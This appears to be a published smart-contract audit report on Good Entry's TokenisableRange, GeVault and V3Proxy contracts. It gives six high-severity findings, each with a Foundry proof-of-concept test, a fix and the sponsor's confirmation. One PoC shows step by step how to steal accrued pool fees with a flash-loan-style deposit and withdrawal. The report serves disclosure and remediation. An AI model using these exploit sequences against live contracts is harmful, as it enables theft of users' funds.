@@ -1,0 +1,152 @@
+[H-01] When price is within position’s range,depositat TokenisableRange can cause loss of funds
+Submitted byxuwinnie
+When slot0 price is within the range of tokenized position, functiondepositneeds to be called with both parameters,n0andn1, greater than zero. However, if price moves outside the range during the transaction, user will be charged an excessive fee.
+Proof of Concept
+if ( fee0+fee1 > 0 && ( n0 > 0 || fee0 == 0) && ( n1 > 0 || fee1 == 0 ) ){address pool = V3_FACTORY.getPool(address(TOKEN0.token), address(TOKEN1.token), feeTier * 100);(uint160 sqrtPriceX96,,,,,,)  = IUniswapV3Pool(pool).slot0();(uint256 token0Amount, uint256 token1Amount) = LiquidityAmounts.getAmountsForLiquidity( sqrtPriceX96, TickMath.getSqrtRatioAtTick(lowerTick), TickMath.getSqrtRatioAtTick(upperTick), liquidity);if (token0Amount + fee0 > 0) newFee0 = n0 * fee0 / (token0Amount + fee0);if (token1Amount + fee1 > 0) newFee1 = n1 * fee1 / (token1Amount + fee1);fee0 += newFee0;fee1 += newFee1;n0   -= newFee0;n1   -= newFee1;}
+Suppose range is [120, 122] and current price is 121. Alice callsdepositwith{n0: 100, n1:100}, if Price moves to 119 during execution (due to market fluctuations or malicious frontrunning),getAmountsForLiquiditywill return 0 fortoken1Amount. As a result,newFee1will be equal ton1, which means all the 100 token1 will be charged as fee.
+(uint128 newLiquidity, uint256 added0, uint256 added1) = POS_MGR.increaseLiquidity(INonfungiblePositionManager.IncreaseLiquidityParams({tokenId: tokenId,amount0Desired: n0,amount1Desired: n1,amount0Min: n0 * 95 / 100,amount1Min: n1 * 95 / 100,deadline: block.timestamp}));
+Then,increaseLiquiditywill succeed sinceamount1Minis now zero.
+Recommended Mitigation Steps
+Don’t use this to calculate fee:
+if ( fee0+fee1 > 0 && ( n0 > 0 || fee0 == 0) && ( n1 > 0 || fee1 == 0 ) ){address pool = V3_FACTORY.getPool(address(TOKEN0.token), address(TOKEN1.token), feeTier * 100);(uint160 sqrtPriceX96,,,,,,)  = IUniswapV3Pool(pool).slot0();(uint256 token0Amount, uint256 token1Amount) = LiquidityAmounts.getAmountsForLiquidity( sqrtPriceX96, TickMath.getSqrtRatioAtTick(lowerTick), TickMath.getSqrtRatioAtTick(upperTick), liquidity);if (token0Amount + fee0 > 0) newFee0 = n0 * fee0 / (token0Amount + fee0);if (token1Amount + fee1 > 0) newFee1 = n1 * fee1 / (token1Amount + fee1);fee0 += newFee0;fee1 += newFee1;n0   -= newFee0;n1   -= newFee1;}
+Always use this:
+uint256 TOKEN0_PRICE = ORACLE.getAssetPrice(address(TOKEN0.token));uint256 TOKEN1_PRICE = ORACLE.getAssetPrice(address(TOKEN1.token));require (TOKEN0_PRICE > 0 && TOKEN1_PRICE > 0, "Invalid Oracle Price");// Calculate the equivalent liquidity amount of the non-yet compounded fees// Assume linearity for liquidity in same tick range; calculate feeLiquidity equivalent and consider it part of base liquidityfeeLiquidity = newLiquidity * ( (fee0 * TOKEN0_PRICE / 10 ** TOKEN0.decimals) + (fee1 * TOKEN1_PRICE / 10 ** TOKEN1.decimals) )/ ( (added0   * TOKEN0_PRICE / 10 ** TOKEN0.decimals) + (added1   * TOKEN1_PRICE / 10 ** TOKEN1.decimals) );
+Keref (Good Entry) disputed and commented:
+Again this concurrency execution environment stuff.
+There is no price moving “during” execution.
+xuwinnie (Warden) commented:
+Again this concurrency execution environment stuff. There is no price moving “during” execution.Hi @Keref, I guess there could be some misunderstanding. Here I mean when price is 121, user will need to submit the tx with {n0: 100, n1:100}, and price could move to 119 when tx gets executed. (something similar to slippage)
+Keref (Good Entry) confirmed and commented:
+Hi, sorry I misunderstood the report, accepted.SeePR#4
+Good Entry Mitigated:
+Remove complex fee clawing strategy.PR:https://github.com/GoodEntry-io/ge/pull/4
+Status:Mitigation confirmed. Full details in reports fromkutugu,xuwinnieand3docSec.
+
+[H-02] Unused funds are not returned and not counted inGeVault
+Submitted byJeiwan, also found byJeiwan,LokiThe5th,osmanozdemir1,said, andHChang26
+Users can lose a portion of their deposited funds if some of their funds haven’t been deposited to the underlying Uniswap pools. There’s always a chance of such event since Uniswap pools take balanced token amounts when liquidity is added butGeVaultdoesn’t pre-compute balanced amounts. As a result, depositing and withdrawing can result in a partial loss of funds.
+Proof of Concept
+TheGeVault.deposit()function is used by users to deposits funds into ticks and underlying Uniswap pools. The function takes funds from the caller and callsrebalance()to distribute the funds among the ticks. TheGeVault.rebalance()function first removes liquidity from all ticks and then deposits the removed assets plus the user assets back in to the ticks:
+functionrebalance()public{require(poolMatchesOracle(),"GEV: Oracle Error");removeFromAllTicks();if(isEnabled)deployAssets();}
+TheGeVault.deployAssets()function calls theGeVault.depositAndStash()function, which actually deposits tokens into aTokenisableRangecontract by calling theTokenisableRange.deposit(). The function deposits tokens into a Uniswap V3 pool and returns unspent tokens to the caller:
+(uint128newLiquidity,uint256added0,uint256added1) =POS_MGR.increaseLiquidity(...);..._mint(msg.sender,lpAmt);TOKEN0.token.safeTransfer(msg.sender,n0-added0);TOKEN1.token.safeTransfer(msg.sender,n1-added1);
+However, theGeVault.depositAndStash()function doesn’t handle the returned unspent tokens. Since Uniswap V3 pools take balanced token amounts (respective to the current pool price) and since the funds deposited into ticks are not balanced (deployAssets()splits token amounts in halves), there’s always a chance that theTokenisableRange.deposit()function won’t consume all specified tokens and will return some of them to theGeVaultcontract. However,GeVaultwon’t return the unused tokens to the depositor.
+Moreover, the contract won’t include them in the TVL calculation:
+TheGeVault.getTVL()function computes the total LP token balance of the contract (getTickBalance(k)) and the price of each LP token (t.latestAnswer()), to compute the total value of the vault.TheGeVault.getTickBalance()function won’t count the unused tokens because it only returns the amount of LP tokens deposited into the lending pool. I.e. only the liquidity deposited to Uniswap pools is counted.TheTokenisableRange.latestAnswer()function computes the total value (TokenisableRange.sol#L355) of the liquidity deposited into the Uniswap pool (TokenisableRange.sol#L338). Thus, the unused tokens won’t be counted here as well.TheGeVault.getTVL()function is used to compute the amount of tokens to return to the depositor during withdrawal.
+Thus, the unused tokens will be locked in the contract until they’re deposited into ticks. However, rebalancing and depositing of tokens can result in new unused tokens that won’t be counted in the TVL.
+Recommended Mitigation Steps
+In theGeVault.deposit()function, consider returning unspent tokens to the depositor. Extra testing is needed to guarantee that rebalancing doesn’t result in unspent tokens, or, alternatively, such tokens could be counted in a storage variable and excluded from the balance of unspent tokens during depositing.
+Alternatively, consider countingGeVault’s token balances in thegetTVL()function. This won’t require returning unspent tokens during depositing and will allow depositors to withdraw their entire funds.
+Keref (Good Entry) confirmed and commented:
+Seeupdate.
+Good Entry Mitigated:
+Take unused funds into account for TVL.PR:https://github.com/GoodEntry-io/ge/commit/a8ba6492b19154c72596086f5531f6821b4a46a2
+Status:Mitigation confirmed. Full details in reports fromkutugu,xuwinnieand3docSec.
+
+[H-03] Overflow can still happen when calculatingpriceX8insidepoolMatchesOracleoperation
+Submitted bysaid, also found byradev_sw,Satyam_Sharma,0xmuxyz,LokiThe5th,Team_FliBit, andT1MOH
+poolMatchesOracleis used to compare price calculated from uniswap v3 pool and chainlink oracle and decide whether rebalance should happened or not.priceX8will be holding price information calculated usingsqrtPriceX96and when operations is performed, it will try to scale down using2 ** 12. However, the scale down is not enough and overflow can still happened.
+Proof of Concept
+Consider this scenario, The GeVault is using WBTC fortoken0and WETH fortoken1.
+These are information for the WBTC/WETH from uniswap v3 pool (0x4585FE77225b41b697C938B018E2Ac67Ac5a20c0):
+slot0 data (at current time) :
+sqrtPriceX96   uint160 :  31520141554881197083247204479961147
+token0(WBTC) decimals is 8 andtoken1(WETH) decimals is 18.
+Using these information, try to reproduce thepriceX8calculation :
+functiontestOraclePrice()public{uint160sqrtPriceX96=31520141554881197083247204479961147;// decimals0 is 8uintpriceX8=10**8;// Overflow if dont scale down the sqrtPrice before div 2*192// @audit - the overflow still possiblepriceX8=(priceX8*uint(sqrtPriceX96/2**12) **2*1e8) /2**168;// decimals1 is 18priceX8=priceX8/10**18;assertEq(true,true);}
+the test result in overflow :
+[FAIL. Reason: Arithmetic over/underflow] testOraclePrice()
+This will cause calculation still overflow, even using the widely used WBTC/WETH pair
+Recommended Mitigation Steps
+Consider to change the scale down using the recommended value from uniswap v3 library:
+https://github.com/Uniswap/v3-periphery/blob/main/contracts/libraries/OracleLibrary.sol#L49-L69
+or change the scale down similar to the one used inside library
+function poolMatchesOracle() public view returns (bool matches){(uint160 sqrtPriceX96,,,,,,) = uniswapPool.slot0();uint decimals0 = token0.decimals();uint decimals1 = token1.decimals();uint priceX8 = 10**decimals0;// Overflow if dont scale down the sqrtPrice before div 2*192-    priceX8 = priceX8 * uint(sqrtPriceX96 / 2 ** 12) ** 2 * 1e8 / 2**168;+    priceX8 = priceX8 * (uint(sqrtPriceX96) ** 2 / 2 ** 64) * 1e8 / 2**128;priceX8 = priceX8 / 10**decimals1;uint oraclePrice = 1e8 * oracle.getAssetPrice(address(token0)) / oracle.getAssetPrice(address(token1));if (oraclePrice < priceX8 * 101 / 100 && oraclePrice > priceX8 * 99 / 100) matches = true;}
+Keref (Good Entry) confirmed and commented:
+SeePR#3.
+Good Entry Mitigated:
+Scale downsqrtPriceX96to prevent overflow.PR:https://github.com/GoodEntry-io/ge/pull/3
+Status:Mitigation confirmed. Full details in reports fromkutugu,xuwinnieand3docSec.
+
+[H-04] TokenisableRange’s incorrect accounting of non-reinvested fees in “deposit” exposes the fees to a flash-loan attack
+Submitted by3docSec
+https://github.com/code-423n4/2023-08-goodentry/blob/71c0c0eca8af957202ccdbf5ce2f2a514ffe2e24/contracts/TokenisableRange.sol#L190
+https://github.com/code-423n4/2023-08-goodentry/blob/71c0c0eca8af957202ccdbf5ce2f2a514ffe2e24/contracts/TokenisableRange.sol#L268
+Vulnerability details
+TheTokenisableRangeis designed to always collect trading fees from the Uniswap V3 pool, whenever there is a liquidity event (depositorwithdraw). These fees may be reinvested in the pool, or may be held in form offee0andfee1ERC-20 balance held by the TokenisableRange contract.
+When a user deposits liquidity in the range, they pay asset tokens, and receive back liquidity tokens, which give them a share of the TokenisableRange assets (liquidity locked in Unisvap V3, plus fee0, and fee1).
+To prevent users from stealing fees, there are several mechanisms in place:
+fees are, as said, always collected whenever liquidity is added or removed, and whenever they exceed 1% of the liquidity in the pool, they are re-invested in Uniswap V3. The intention of this check seems to be limiting the value locked in these feeswhenever a user deposits liquidity to the range, the LP tokens given to them are scaled down by the value of the fees, so the participation in fees “is not given away for free”
+Both of these mechanisms can however be worked around:
+the 1% check is done on thefee0andfee1amountscompared to the theoretical pool amounts, andnot on the total value of the feesas compared to the total value locked in the pool. This means that when the price changes significantly from when fees were accumulated, the combined value of the fees can exceed, potentially by much, the 1% intended cap, without the reinvestment happening before liquidity events. A malicious user can then monitor and act in such market conditions.the downscaling of the LP tokens minted to the user happens only if none of the provided liquidity is added to the pool fees instead of the Uniswap V3 position. The user can send just a few wei’s of tokens to short-circuit the downscaling, and have a share of fees “for free”.
+Impact
+Given a TokenisableRange contract in the right state (high value locked in fees, but still no reinvestment happening) a user can maliciously craft adepositandwithdrawsequence (why not, with flash-loaned assets) to steal most of the fees (fee0,fee1) held by the pool before distribution.
+Proof of Concept
+Below is a working PoC that shows under real market conditions how most of the fees (>3% of the pool assets) can be s stolen risk-free by simply depositing and withdrawing a large quantity of liquidity:
+functiontestStolenFeesPoc()public{vm.createSelectFork("mainnet",17811921);vm.prank(tokenWhale);USDC.transfer(alice,100_000e6);vm.startPrank(alice);TokenisableRangetr=newTokenisableRange();// out of range: WETH is more valuable than that (about 1870 USDC on this block 17811921);// the pool will hold 0 WETHtr.initProxy(AaveOracle,USDC,WETH,500e10,1000e10,"Test1","T1",false);USDC.approve(address(tr),100_000e6);tr.init(100_000e6,0);// time passes, and the pool trades in range, accumulating feesuint256fee0=1_000e6;uint256fee1=2e18;vm.mockCall(address(UniswapV3UsdcNFPositionManager),abi.encodeWithSelector(INonfungiblePositionManager.collect.selector),abi.encode(fee0,fee1));vm.stopPrank();vm.startPrank(tokenWhale);USDC.transfer(address(tr),fee0);WETH.transfer(address(tr),fee1);// now the price is back to 1870 USDC,// the undistributed fees are 1k USDC and 2 WETH,// in total about $5k or 5% of the pool value// (the percentage can be higher with bigger price swings)// but still, they are not reinvestedtr.claimFee();vm.clearMockedCalls();require(tr.fee0() !=0);require(tr.fee1() !=0);// an attacker now can flashloan & deposit an amount that will give them// the majority of the pool liquidity, then withdraw for a profituint256usdcBalanceBefore=USDC.balanceOf(tokenWhale);uint256wethBalanceBefore=WETH.balanceOf(tokenWhale);uint256poolSharesBefore=tr.balanceOf(tokenWhale);USDC.approve(address(tr),10_000_000e6);// this is the hack: we add just a tiny little bit of WETH so TokenisableRange doesn't// count the value locked in fees in assigning the LP tokensWETH.approve(address(tr),1000);uint256deposited=tr.deposit(10_000_000e6,1000);tr.withdraw(deposited,0,0);// the profit here is// 1 wei of USDC lost, probably to roundingconsole2.log(int(USDC.balanceOf(tokenWhale)) -int(usdcBalanceBefore));// 1.58 WETH of profit, which is most of the fees,// and definitely more than 1% of the pool. Yay!console2.log(int(WETH.balanceOf(tokenWhale)) -int(wethBalanceBefore));require(poolSharesBefore==tr.balanceOf(tokenWhale));}
+It is important to note that since the WETH oracle price at the forked block (17811921) is at 1870, above the 500-1000 range, the above PoC works only after fixing my other finding titled:
+Incorrect Solidity version in FullMath.sol can cause permanent freezing of assets for arithmetic underflow-induced revert
+Recommended Mitigation Steps
+Factor in also the token prices when calculating whether the accrued fees are indeed 1% of the poolWhen minting TokenisableRange tokens,alwaysdownscale the minted fees by the relative value of non-distributed fees in the pool:
+// Stack too deep, so localising some variables for feeLiquidity calculations-    // If we already clawed back fees earlier, do nothing, else we need to adjust returned liquidity-    if ( newFee0 == 0 && newFee1 == 0 ){+    {uint256 TOKEN0_PRICE = ORACLE.getAssetPrice(address(TOKEN0.token));uint256 TOKEN1_PRICE = ORACLE.getAssetPrice(address(TOKEN1.token));require (TOKEN0_PRICE > 0 && TOKEN1_PRICE > 0, "Invalid Oracle Price");// Calculate the equivalent liquidity amount of the non-yet compounded fees// Assume linearity for liquidity in same tick range; calculate feeLiquidity equivalent and consider it part of base liquidityfeeLiquidity = newLiquidity * ( (fee0 * TOKEN0_PRICE / 10 ** TOKEN0.decimals) + (fee1 * TOKEN1_PRICE / 10 ** TOKEN1.decimals) )/ ( (added0   * TOKEN0_PRICE / 10 ** TOKEN0.decimals) + (added1   * TOKEN1_PRICE / 10 ** TOKEN1.decimals) );}
+Keref (Good Entry) confirmed and commented:
+SeePR#4.
+Good Entry Mitigated:
+Remove complex fee clawing strategy.PR:https://github.com/GoodEntry-io/ge/pull/4
+Status:Mitigation confirmed. Full details in reports fromkutugu,xuwinnieand3docSec.
+
+[H-05] V3Proxy swapTokensForExactETH does not send back to the caller the unused input tokens
+Submitted by3docSec, also found byFulum,Limbooo,DanielArmstrong,T1MOH, andKrace
+TheV3ProxyswapTokensForExactETHfunction swaps an unspecified amount of a given ERC-20 for a specified amount of the native currency. After the swap happens, however, the difference between the amount taken from the caller (amountInMax) and the actual swapped amount (amounts[0]) is not given back to the caller and remains locked in the contract.
+Impact
+Any user of theswapTokensForExactETHwill always payamountInMaxfor swaps even if part of it was not used for the swap. This part is lost, locked in theV3Proxycontract.
+Proof of Concept
+CallswapTokensForExactETHwith an excessively highamountInMaxCheck that any extra input tokens are sent back - this check will fail
+functiontestV3ProxyKeepsTheChange()public{IQuoterq=IQuoter(0xb27308f9F90D607463bb33eA1BeBb41C27CE5AB6);ISwapRouterr=ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564);V3Proxyv3proxy=newV3Proxy(r,q,500);vm.label(address(v3proxy),"V3Proxy");address[]memorypath=newaddress[](2);path[0] =address(USDC);path[1] =address(WETH);address[]memorypath2=newaddress[](2);path2[0] =address(WETH);path2[1] =address(USDC);// fund Alicevm.prank(tokenWhale);USDC.transfer(alice,1870e6);// Alice initiates a swapuint256[]memoryamounts;uint256balanceUsdcBefore=USDC.balanceOf(alice);uint256balanceBefore=alice.balance;vm.startPrank(alice);USDC.approve(address(v3proxy),1870e6);amounts=v3proxy.swapTokensForExactETH(1e18,1870e6,path,alice,block.timestamp);// we check if the swap was done wellrequire(amounts[0] <1870e6);require(amounts[1] ==1e18);require(alice.balance==balanceBefore+amounts[1]);// the following check fails, but would pass if swapTokensForExactETH// sent back the excess tokensrequire(USDC.balanceOf(alice) ==balanceUsdcBefore-amounts[0],"Unused input tokens were not sent back!");}
+Recommended Mitigation Steps
+Send back the excess tokens:
+function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline) payable external returns (uint[] memory amounts) {require(path.length == 2, "Direct swap only");require(path[1] == ROUTER.WETH9(), "Invalid path");ERC20 ogInAsset = ERC20(path[0]);ogInAsset.safeTransferFrom(msg.sender, address(this), amountInMax);ogInAsset.safeApprove(address(ROUTER), amountInMax);amounts = new uint[](2);amounts[0] = ROUTER.exactOutputSingle(ISwapRouter.ExactOutputSingleParams(path[0], path[1], feeTier, address(this), deadline, amountOut, amountInMax, 0));amounts[1] = amountOut;ogInAsset.safeApprove(address(ROUTER), 0);IWETH9 weth = IWETH9(ROUTER.WETH9());acceptPayable = true;weth.withdraw(amountOut);acceptPayable = false;payable(msg.sender).call{value: amountOut}("");+        ogInAsset.safeTransfer(msg.sender, amountInMax - amounts[0]);emit Swap(msg.sender, path[0], path[1], amounts[0], amounts[1]);}
+Keref (Good Entry) confirmed and commented:
+SeePR#2.
+Good Entry Mitigated:
+Send back unused funds to user.PR:https://github.com/GoodEntry-io/ge/pull/2
+Status:Mitigation confirmed. Full details in reports fromkutugu,xuwinnieand3docSec.
+
+[H-06] Incorrect Solidity version in FullMath.sol can cause permanent freezing of assets for arithmetic underflow-induced revert
+Submitted by3docSec, also found by Vagner (1,2),hassan-truscova, R-Nemes (1,2),auditsea,nadin, andn1punp
+https://github.com/code-423n4/2023-08-goodentry/blob/71c0c0eca8af957202ccdbf5ce2f2a514ffe2e24/contracts/TokenisableRange.sol#L227
+https://github.com/code-423n4/2023-08-goodentry/blob/71c0c0eca8af957202ccdbf5ce2f2a514ffe2e24/contracts/TokenisableRange.sol#L227
+https://github.com/code-423n4/2023-08-goodentry/blob/71c0c0eca8af957202ccdbf5ce2f2a514ffe2e24/contracts/TokenisableRange.sol#L240
+https://github.com/code-423n4/2023-08-goodentry/blob/71c0c0eca8af957202ccdbf5ce2f2a514ffe2e24/contracts/TokenisableRange.sol#L187
+https://github.com/code-423n4/2023-08-goodentry/blob/71c0c0eca8af957202ccdbf5ce2f2a514ffe2e24/contracts/TokenisableRange.sol#L338
+https://github.com/code-423n4/2023-08-goodentry/blob/71c0c0eca8af957202ccdbf5ce2f2a514ffe2e24/contracts/lib/FullMath.sol#L2
+Vulnerability details
+TokenisableRangemakes use of theLiquidityAmounts.getAmountsForLiquidityhelper function in itsreturnExpectedBalanceWithoutFees,getTokenAmountsExcludingFeesanddepositfunctions to convert UniswapV3 pool liquidity into estimated underlying token amounts.
+This functiongetAmountsForLiquiditywill trigger an arithmetic underflow wheneversqrtRatioX96is smaller thansqrtRatioAX96, causing these functions to revert until this ratio comes back in range and the math no longer overflows.
+Such oracle price conditions are not only possible but also likely to happen in real market conditions, and they can be permanent (i.e. one asset permanently appreciating over the other one).
+Moving up the stack, assuming thatLiquidityAmounts.getAmountsForLiquiditycan revert (which is shown in the below PoC with real-world conditions), both thereturnExpectedBalanceWithoutFeesandgetTokenAmountsExcludingFeesfunctions can revert. In particular, the formeris called by theclaimFee()function, which is always called whendepositingandwithdrawingliquidity.
+The root cause of this issue is that the FullMath.sol library,imported from UniswapV3wasaltered to build with solidity v0.8.x, which has under/overflow protection; the library, however, makes use of these by design, so it won’t work properly when compiled in v0.8.0 or later:
+/// @dev Handles "phantom overflow" i.e., allows multiplication and division where an intermediate value overflows 256 bitslibraryFullMath{
+Impact
+When the fair exchange price of the pool backing the TokenisableRange’s falls outside the range (higher side), thedepositandwithdrawwill always revert, locking the underlying assets in the pool until the price swings to a different value that does not trigger an under/overflow. If the oracle price stays within this range indefinitely, the funds are permanently locked.
+Proof of Concept
+I’ll prove that permanent freezing can happen in two steps:
+first I’ll show one condition where the underflow happensthen, I’ll set up a fuzz test to prove that given an A and B ticker, we cannot find a market price lower than A such that the underflow does not happen
+The most simple way to prove the first point is by callingLiquidityAmounts.getAmountsForLiquidityin isolation with real-world values:
+functiontestGetAmountsForLiquidityRevert()public{// real-world value: it's in fact the value returned by// V3_FACTORY.getPool(USDC, WETH, 500).slot0();// at block 17811921; it is around 1870 USDC per WETHuint160sqrtRatioX96=1834502451234584391374419429242405;// start price and end corresponding to 1700 to 1800 USDC per WETHuint160sqrtRatioAX96=1866972058592130739290643700340936;uint160sqrtRatioBX96=1921904167735311150677430952623492;vm.expectRevert();LiquidityAmounts.getAmountsForLiquidity(sqrtRatioX96,sqrtRatioAX96,sqrtRatioBX96,1e18);}
+However, a more integrated test that involves PositionManager can also be considered:
+function testPocReturnExpectedBalanceUnderflow() public {vm.createSelectFork("mainnet",17811921);vm.startPrank(tokenWhale);TokenisableRange tr = new TokenisableRange();tr.initProxy(AaveOracle, USDC, WETH, 1700e10, 1800e10, "Test1", "T1", false);USDC.approve(address(tr), 100_000e6);tr.init(100_000e6, 0);vm.expectRevert();tr.returnExpectedBalance(0, 0);}
+Then, we can prove the second point with a negative fuzz test:
+functiontestFailPermanentFreeze(uint160sqrtRatioX96)public{// start & and price, corresponding to 1700 to 1800 USDC per WETHuint160sqrtRatioAX96=1866972058592130739290643700340936;uint160sqrtRatioBX96=1921904167735311150677430952623492;// make sure that the market ratio is lower than the lower ticker// that is the range where I first observed the underflow// (WETH above 1800 USDC)sqrtRatioX96=sqrtRatioX96% (sqrtRatioAX96-1);// expect a revert hereLiquidityAmounts.getAmountsForLiquidity(sqrtRatioX96,sqrtRatioAX96,sqrtRatioBX96,1e18);}
+Tools Used
+IDE, Foundry
+Recommended Mitigation Steps
+Restorethe original FullMath.sol libraryso it compiles with solc versions earlier than 0.8.0.
+// SPDX-License-Identifier: GPL-3.0-pragmasolidity^0.8.4;+pragmasolidity>=0.4.0<0.8.0;/// @title Contains 512-bit math functions/// @notice Facilitates multiplication and division that can have overflow of an intermediate value without any loss of precision/// @dev Handles "phantom overflow" i.e., allows multiplication and division where an intermediate value overflows 256 bits
+Another possible option, which is however not recommended, is to enclose the non-assembly statements of FullMath.sol in anuncheckedblock.
+Keref (Good Entry) confirmed and commented:
+There’s an error with those lib versions, and we will replace with libs from the0.8 branch.
+Good Entry Mitigated:
+Use correct Uniswap for sol^0.8libs.PR:https://github.com/GoodEntry-io/ge/commit/8b0feaec0005937c8e6c7ef9bf039a0c2498529a
+Status:Mitigation confirmed. Full details in reports fromkutugu,xuwinnieand3docSec.
+
